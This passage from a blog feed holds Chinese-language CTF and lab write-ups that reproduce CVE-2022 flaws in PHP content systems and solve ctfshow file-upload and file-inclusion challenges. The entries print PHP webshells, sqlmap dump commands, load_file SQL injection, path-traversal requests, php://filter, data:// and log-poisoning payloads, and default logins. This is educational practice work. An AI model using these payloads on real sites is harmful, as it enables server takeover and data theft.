    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-30887</title>
    <link href="/2024/02/24/cve-2022-30887/"/>
    <url>/2024/02/24/cve-2022-30887/</url>
    
    <content type="html"><![CDATA[<h1>CVE-2022-30887细节</h1><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">多语言药房管理系统 (<span class="hljs-built_in">MPMS</span>) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该<span class="hljs-built_in">CMS</span>中php_action/editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。<br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-30887/30887.5.jpg" class=""><h1>过程</h1><h2 id="信息搜集">信息搜集</h2><p>查看开发者的主页，有源码，有邮箱</p><img src="/2024/02/24/cve-2022-30887/30887.3.jpg" class=""><img src="/2024/02/24/cve-2022-30887/30887.2.jpg" class=""><p>用户名和密码：mayuri.infospace@gmail.com、mayuri（虽然我也不知道这哪里来的）</p><h2 id="准备好一句话木马">准备好一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]):<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="文件上传">文件上传</h2><p>上传成功后访问图片地址：</p><h2 id="命令执行">命令执行</h2><p>使用hackbar：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;tac /f*&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-28612</title>
    <link href="/2024/02/24/cve-2022-28512/"/>
    <url>/2024/02/24/cve-2022-28512/</url>
    
    <content type="html"><![CDATA[<h1>cve-2022-28512描述</h1><p>Fantastic Blog (CMS)是一个绝对出色的博客/文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的/single.php路径下，id参数存在一个SQL注入漏洞。</p><h1>过程</h1><img src="/2024/02/24/cve-2022-28512/28512.1.jpg" class=""><img src="/2024/02/24/cve-2022-28512/28512.2.jpg" class=""><table><thead><tr><th></th><th>value</th></tr></thead><tbody><tr><td>ua</td><td>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</td></tr><tr><td>cookie</td><td>Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669557790,1669559917,1669647635,1669724732; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669724732; __atuvc=1%7C48; __atuvs=6385fa760f76dd51000</td></tr></tbody></table><img src="/2024/02/24/cve-2022-28512/28512.3.jpg" class=""><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://eci-2ze6z6gdw8c1avrgchhb.cloudeci1.ichunqiu.com/single.php?id=2&quot;</span>  <span class="hljs-params">--user-agent=</span><span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669557790,1669559917,1669647635,1669724732; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669724732; __atuvc=1%7C48; __atuvs=6385fa760f76dd51000&quot;</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p>爆库</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://eci-2ze6z6gdw8c1avrgchhb.cloudeci1.ichunqiu.com/single.php?id=2&quot;</span>  <span class="hljs-params">--user-agent=</span><span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669557790,1669559917,1669647635,1669724732; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669724732; __atuvc=1%7C48; __atuvs=6385fa760f76dd51000&quot;</span> -batch <span class="hljs-params">--dbs</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-28512/28512.4.jpg" class=""><p>爆表</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://eci-2ze6z6gdw8c1avrgchhb.cloudeci1.ichunqiu.com/single.php?id=2&quot;</span>  <span class="hljs-params">--user-agent=</span><span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669557790,1669559917,1669647635,1669724732; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669724732; __atuvc=1%7C48; __atuvs=6385fa760f76dd51000&quot;</span> -batch -D <span class="hljs-string">&quot;ctf&quot;</span> <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-28512/28512.5.jpg" class=""><p>爆字段</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://eci-2ze6z6gdw8c1avrgchhb.cloudeci1.ichunqiu.com/single.php?id=2&quot;</span>  <span class="hljs-params">--user-agent=</span><span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669557790,1669559917,1669647635,1669724732; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669724732; __atuvc=1%7C48; __atuvs=6385fa760f76dd51000&quot;</span> -batch -D <span class="hljs-string">&quot;ctf&quot;</span> -T <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-28512/28512.6.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-28060</title>
    <link href="/2024/02/24/cve-2022-28060/"/>
    <url>/2024/02/24/cve-2022-28060/</url>
    
    <content type="html"><![CDATA[<h1>cve-2022-28060描述</h1><p>Victor CMS v1.0 /includes/login.php 存在sql注入</p><h1>过程</h1><table><thead><tr><th></th><th>value</th></tr></thead><tbody><tr><td>url</td><td><a href="http://eci-2zee52k1dpi9un6hmgr6.cloudeci1.ichunqiu.com/includes/login.php">http://eci-2zee52k1dpi9un6hmgr6.cloudeci1.ichunqiu.com/includes/login.php</a></td></tr><tr><td>ua</td><td>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</td></tr><tr><td>cookie</td><td>Hm_lvt_2d0601bd28de7d49818249cf35d95943=1669557790,1669559917,1669647635,1669724732; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1669726981; PHPSESSID=vus5thjtc4uelgs8po88kpg96r</td></tr></tbody></table><h2 id="抓包">抓包</h2><p>在登录框中输入信息后抓包，将所有内容复制到文件1.txt中：</p><img src="/2024/02/24/cve-2022-28060/28060.1.jpg" class=""><h2 id="sqlmap攻击">sqlmap攻击</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">sqlmap</span></span> -r .../<span class="hljs-number">1.</span>txt --<span class="hljs-keyword">file</span>-read <span class="hljs-string">&quot;/flag&quot;</span> --dbms Mysql<br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-28060/28060.2.jpg" class=""><p>需要手动确认“y”</p><p>攻击结果：</p><img src="/2024/02/24/cve-2022-28060/28060.3.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-26965</title>
    <link href="/2024/02/24/cve-2022-26965/"/>
    <url>/2024/02/24/cve-2022-26965/</url>
    
    <content type="html"><![CDATA[<h1>cve-2022-26965描述</h1><p>在 Pluck 4.7.16 中，管理员用户可以使用 /admin.php?action=themeinstall 中的主题上传功能来执行远程代码执行。</p><h1>过程</h1><h2 id="弱口令登录">弱口令登录</h2><img src="/2024/02/24/cve-2022-26965/26965.1.png" class=""><h2 id="文件上传">文件上传</h2><p>1、install themes</p><img src="/2024/02/24/cve-2022-26965/26965.2.png" class=""><p>2、上传shell.php</p><img src="/2024/02/24/cve-2022-26965/26965.3.png" class=""><p>3、报错：文件不合法</p><img src="/2024/02/24/cve-2022-26965/26965.4.png" class=""><p>4、以压缩包的形式上传</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 压缩文件shell.php</span><br>tar acvf <span class="hljs-built_in">shell</span>.tar.gz <span class="hljs-built_in">shell</span>.php<br></code></pre></td></tr></table></figure><p>官方提示的文件保存路径：/data/themes</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">.../data/themes/shell.php<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-26201</title>
    <link href="/2024/02/24/cve-2022-26201/"/>
    <url>/2024/02/24/cve-2022-26201/</url>
    
    <content type="html"><![CDATA[<h1>cve-2022-26201描述</h1><p>Victor CMS v1.0 存在二次注入漏洞。该漏洞存在于 <code>/admin/categories.php</code> 中，可以通过POST请求对 <code>cat_title</code> 参数注入SQL语句，进而导致二次注入漏洞。</p><h1>过程</h1><p>1、点击导航栏里的admin</p><img src="/2024/02/24/cve-2022-26201/26201.1.png" class=""><p>2、输入payload</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-string">&#x27;),(concat(&#x27;</span><span class="hljs-built_in">flag</span>:<span class="hljs-string">&#x27;,load_file(&#x27;</span>/<span class="hljs-built_in">flag</span><span class="hljs-string">&#x27;)))--+  # 不成功</span><br><span class="hljs-string">&#x27;</span>),(concat(<span class="hljs-string">&#x27;flag:&#x27;</span>,load_file(<span class="hljs-string">&#x27;/flag&#x27;</span>)))-- -# 成功<br><span class="hljs-string">&#x27;),(concat(&#x27;</span><span class="hljs-built_in">flag</span>:<span class="hljs-string">&#x27;,load_file(&#x27;</span>/<span class="hljs-built_in">flag</span><span class="hljs-string">&#x27;)))-- # 成功（有空格）</span><br></code></pre></td></tr></table></figure><p>3、拿到flag</p><img src="/2024/02/24/cve-2022-26201/26201.2.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-25578</title>
    <link href="/2024/02/24/cve-2022-25578/"/>
    <url>/2024/02/24/cve-2022-25578/</url>
    
    <content type="html"><![CDATA[<h1>cve-2022-25578概述</h1><p>taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</p><h1>过程</h1><p>1、点击“管理”</p><img src="/2024/02/24/cve-2022-25578/25578.1.jpg" class=""><p>2、默认密码登录：admin、tao</p><img src="/2024/02/24/cve-2022-25578/25578.2.jpg" class=""><p>3、编辑首页文件</p><img src="/2024/02/24/cve-2022-25578/25578.3.png" class=""><p>4、添加一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-25578/25578.4.png" class=""><p>5、访问首页，执行命令</p><p>6、拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-25401</title>
    <link href="/2024/02/24/cve-2022-25401/"/>
    <url>/2024/02/24/cve-2022-25401/</url>
    
    <content type="html"><![CDATA[<h1>cve-2022-25401描述</h1><p>Cuppa CMS v1.0 administrator/templates/default/html/windows/right.php文件存在任意文件读取漏洞</p><h1>过程</h1><h2 id="根据提示访问网址">根据提示访问网址</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>eci-<span class="hljs-number">2</span>ze8ijgd72hp3b6u73cy.cloudeci1.ichunqiu.com<span class="hljs-regexp">/administrator/</span>templates<span class="hljs-regexp">/default/</span>html<span class="hljs-regexp">/windows/</span>right.php<br></code></pre></td></tr></table></figure><p>返回404，可能是官方给的网址有误</p><img src="/2024/02/24/cve-2022-25401/25401.2.jpg" class=""><h2 id="找到真正的网址">找到真正的网址</h2><p><strong>扫描</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirb http:<span class="hljs-comment">//eci-2ze8ijgd72hp3b6u73cy.cloudeci1.ichunqiu.com</span><br></code></pre></td></tr></table></figure><p><strong>发现网址</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>eci-<span class="hljs-number">2</span>ze8ijgd72hp3b6u73cy.cloudeci1.ichunqiu.com<span class="hljs-regexp">/templates/</span>default<span class="hljs-regexp">/html/</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-25401/25401.3.jpg" class=""><img src="/2024/02/24/cve-2022-25401/25401.4.jpg" class=""><p><strong>代码审计</strong></p><p>right.php的53行中：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;url&quot;</span>];<br><span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$url</span>, <span class="hljs-string">&quot;../&quot;</span>) || strstr(<span class="hljs-variable">$url</span>, <span class="hljs-string">&quot;..\\&quot;</span>))&#123;<br>echo <span class="hljs-string">&quot;Security attack!&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br></code></pre></td></tr></table></figure><p><strong>访问文件</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -X POST <span class="hljs-string">&quot;http://eci-2zea9n2l7yg5atado47q.cloudeci1.ichunqiu.com/templates/default/html/windows/right.php&quot;</span> -d <span class="hljs-string">&quot;url=../../../../../../../../../../../../flag&quot;</span>  <br><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-25401/25401.5.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>cve-2022-25099</title>
    <link href="/2024/02/24/cve-2022-25099/"/>
    <url>/2024/02/24/cve-2022-25099/</url>
    
    <content type="html"><![CDATA[<h1>cve-2022-25099描述</h1><p>WBCE CMS v1.5.2 /language/install.php 文件存在漏洞，攻击者可精心构造文件上传造成RCE</p><h1>过程</h1><h2 id="登录">登录</h2><p>访问网址，发现没有进入到登录页面</p><img src="/2024/02/24/cve-2022-25099/25099.1.jpg" class=""><p>在url后面添加/admin，跳转到登录页面</p><img src="/2024/02/24/cve-2022-25099/25099.2.jpg" class=""><p>弱口令登录：admin/123456</p><img src="/2024/02/24/cve-2022-25099/25099.3.jpg" class=""><p>上传shell，报错，无法上传至后端：</p><img src="/2024/02/24/cve-2022-25099/25099.4.jpg" class=""><p>虽然shell脚本不能在后端执行，但是可以看看能否将信息返回到前端页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-25099/25099.5.jpg" class=""><p>成功执行，接下来直接读取文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/cve-2022-25099/25099.6.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>春秋云镜-cve</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门-文件上传</title>
    <link href="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1>151</h1><p><strong>准备php文件</strong>：test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>在源码中修改后缀，前端绕过</strong></p><p><strong>查找路径</strong></p><p><strong>读取flag文件</strong></p><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151.1.jpg" class=""><p><strong>在源码中查看flag</strong></p><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151.2.jpg" class=""><h1>152</h1><p><strong>先绕过前端</strong></p><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/152.2.jpg" class=""><p><strong>抓包修改，绕过后端</strong></p><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/152.1.jpg" class=""><p><strong>执行命令</strong></p><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/152.3.jpg" class=""><p><strong>源码得到flag</strong></p><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/152.4.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门-文件包含</title>
    <link href="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1>78 filter伪协议</h1><p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解法1：filter伪协议</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.../?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>然后使用base64解码</p><p><strong>解法2：data伪协议</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?f</span>ile=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span><span class="hljs-string">`tac f*`</span>;<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h1>79 data伪协议</h1><p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>把php替换成???，filter伪协议不可以，则可以用data伪协议</p><p><strong>解法</strong></p><p>1、<code>data伪协议+短标签</code>尝试使用</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.../<span class="hljs-string">?f</span>ile=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span>eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-string">?&gt;</span><br><br>post data：<br><span class="hljs-number">1</span>=phpinfo();<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/79.1.jpg" class=""><p>2、成功绕过</p><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/79.2.jpg" class=""><p>3、payload，直接读文件</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">post data：<br><span class="hljs-number">1</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;tac flag.php&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h1>80 日志包含</h1><p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><p>1、在UA里面插入日志</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80.1.jpg" class=""><p>2、查看文件名</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-params">...</span>/?file=/<span class="hljs-built_in">var</span>/<span class="hljs-keyword">log</span>/nginx/access.<span class="hljs-keyword">log</span><br><br>post <span class="hljs-built_in">data</span>：<br><span class="hljs-number">1</span>=system(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80.2.jpg" class=""><p>3、读取flag</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;cat fl0g.php&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>在网页源码中得到flag</p><img src="/2024/02/24/ctfshow_web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80.3.jpg" class=""><h1>81</h1><p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解法</strong></p><p>换成短标签，其余不变</p><figure class="highlight 